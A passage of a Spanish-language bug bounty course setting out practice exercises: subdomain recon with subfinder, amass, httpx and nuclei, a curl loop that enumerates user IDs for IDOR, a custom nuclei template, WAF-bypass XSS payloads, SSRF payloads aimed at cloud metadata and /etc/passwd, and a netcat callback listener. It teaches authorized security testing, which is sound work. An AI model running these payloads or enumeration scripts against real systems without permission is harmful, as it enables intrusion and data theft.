Comandos: subfinder -d ejemplo.com -all -o subfinder.txt amass enum -passive -d ejemplo.com -o amass.txt httpx -l subfinder.txt amass.txt -o alive.txt httpx -l alive.txt -tech-detect -o tech.txt katana -list alive.txt -o crawled.txt gau --subs ejemplo.com > gau_urls.txt echo ejemplo.com | waybackurls > wayback_urls.txt nuclei -l alive.txt -o nuclei_results.txt
```

### Ejercicio 3: Encontrar IDOR en una API REST

**Objetivo:** Detectar IDOR en una API típica.

```
Elegí un programa con API endpoints.

Pasos:
1. Crear dos cuentas de prueba (User A y User B)
2. Autenticarse como User A
3. Identificar endpoints con IDs (/api/v1/users/{id})
4. Probar cambiar el ID de User A a User B
5. Si funciona, probar enumeración de IDs

Script de prueba: for id in $(seq 1 100); do response=$(curl -s -o /dev/null -w "%{http_code}" \ -H "Authorization: Bearer TOKEN" \ "https://target.com/api/v1/users/$id") if [ "$response" != "403" ] && [ "$response" != "404" ]; then echo "User $id accessible: $response" fi done
```

### Ejercicio 4: Escribir un Template de Nuclei Custom

**Objetivo:** Crear un template de nuclei para detectar una vulnerabilidades) específica.

```
Elegí una vulnerabilidad que quieras detectar
(ej: admin panel expuesto, endpoint de debug, etc.).

Pasos:
1. Identificar un patrón único en la respuesta
2. Crear el template YAML
3. Probar el template contra un target

Template: id: custom-debug-detect info: name: Debug Endpoint Detector severity: medium requests: - method: GET path: - "{{BaseURL}}/debug" - "{{BaseURL}}/console" matchers: - type: word words: - "DEBUG" - "Console" - "Stack trace"

Probar: nuclei -l alive.txt -t custom-template.yaml
```

### Ejercicio 5: Report Writing Simulado

**Objetivo:** Escribir un reporte de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) completo y profesional.

```
Supongamos que encontraste un IDOR en un programa de HackerOne.

Pasos:
1. Definir un escenario realista
2. Escribir el título del reporte
3. Escribir la descripción detallada
4. Explicar el impacto
5. Escribir los Steps to Reproduce
6. Armar el PoC (con requests HTTP y script Python)
7. Sugerir remediación
8. Calcular el CVSS score

Formato: TITLE: IDOR in GET /api/v1/users/{id} allows access to other users profiles SEVERITY: High (CVSS 6.5) DESCRIPTION: [3-5 párrafos explicando la vulnerabilidad] IMPACT: [2-3 párrafos sobre las consecuencias] STEPS: [pasos numerados claros] PoC: [código o requests] REMEDIATION: [recomendaciones técnicas]
```

### Ejercicio 6: Análisis de un Programa Bug Bounty

**Objetivo:** Analizar un programa de bug bounty real.

```
Elegí un programa de HackerOne o Bugcrowd.

Pasos:
1. Leer el scope completo del programa
2. Identificar los tipos de bugs que aceptan
3. Identificar qué está out-of-scope
4. Investigar si hay programas similares
5. Analizar el VRT o la tabla de bounties
6. Mirar los reportes públicos del programa en Hacktivity
7. Identificar tendencias (qué tipo de bugs son más comunes)

Entregable: - Análisis escrito de 1-2 páginas - Estrategia de ataque basada en el análisis
```

### Ejercicio 7: Automatización de Recon con scriptingting)

**Objetivo:** Crear un script que automatice todo el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de recon.

```
Crear un script en bash o Python que haga:

1. Tome un dominio como input
2. Ejecute subfinder + amass para subdominios
3. Resuelva subdominios vivos con httpx
4. Detecte tecnologías
5. Escanee con nuclei
6. Genere un reporte resumido

Script bash ejemplo: #!/bin/bash DOMAIN=$1 echo "[*] Starting recon on $DOMAIN" subfinder -d $DOMAIN -all -o $DOMAIN-subs.txt httpx -l $DOMAIN-subs.txt -o $DOMAIN-alive.txt httpx -l $DOMAIN-alive.txt -tech-detect -o $DOMAIN-tech.txt nuclei -l $DOMAIN-alive.txt -o $DOMAIN-nuclei.txt echo "[*] Recon complete!" echo "Subdomains: $(wc -l < $DOMAIN-subs.txt)" echo "Alive: $(wc -l < $DOMAIN-alive.txt)" echo "Findings: $(wc -l < $DOMAIN-nuclei.txt)"
```

### Ejercicio 8: Bypass de WAF

**Objetivo:** Investigar y probar técnicas de bypass de WAF.

```
Elegí un target que tenga WAF (Cloudflare, Akamai, ModSecurity, etc.)

Pasos:
1. Identificar qué WAF está usando (wafw00f, detecteazy)
2. Investigar técnicas de bypass para ese WAF
3. Probar payloads alternativos: - Case variations - Encoding bypass - Comment injection - Parameter pollution - HTTP method alternation

Herramientas: wafw00f https://target.com detecteazy https://target.com

Payload example: Normal:  <script>alert(1)</script> Bypass:  <ScRiPt>alert(1)</ScRiPt> Bypass2: <script>eval(atob('YWxlcnQoMSk=')</script> Bypass3: <scr<script>ipt>alert(1)</scr</script>ipt>
```

### Ejercicio 9: [ssrf](../raw/w3b-h4ck1ng.md#ssrf) Discovery Lab

**Objetivo:** Encontrar SSRF en aplicaciones web.

```
Identificar features que hacen requests a URLs externas:
- Avatar/image uploads
- Document preview generators
- Webhook configurations
- PDF generators
- Import/export functions
- Proxy endpoints

Payloads para probar: url=http://127.0.0.1:8080 url=http://169.254.169.254/latest/meta-data/ url=file:///etc/passwd url=http://[::]:22

Setup de listener para detectar callbacks: # Usar interactsh nuclei -interactsh-url http://target.com # O tu propio VPS nc -lnvp 8080 python3 -m http.server 8080
```

### Ejercicio 10: Full Bug Bounty Workflow Simulation

**Objetivo:** Simular el workflow completo de bug bounty.

```
Día 1-2: Reconnaissance - Elegir un programa público de HackerOne - Hacer recon completo (subdominios, tecnologías, endpoints) - Documentar todo

Día 3-5: Scanning & Analysis - Ejecutar nuclei, dalfox, directory scanning - Analizar resultados - Identificar 3-5 leads interesantes

Día 6-8: Manual Testing - Probar IDOR en endpoints de API - Probar XSS en todos los parámetros - Probar authentication/authorization flaws - Probar business logic vulnerabilities

Día 9-10: Reporting - Escribir reportes detallados para cada finding - Incluir PoC, screenshots, CVSS - Revisar y pulir cada reporte

Reflexión: - ¿Cuántos bugs encontraste? - ¿Qué técnicas funcionaron mejor? - ¿Qué mejorarías para la próxima? - ¿Cuánto tiempo tomó cada fase?
```


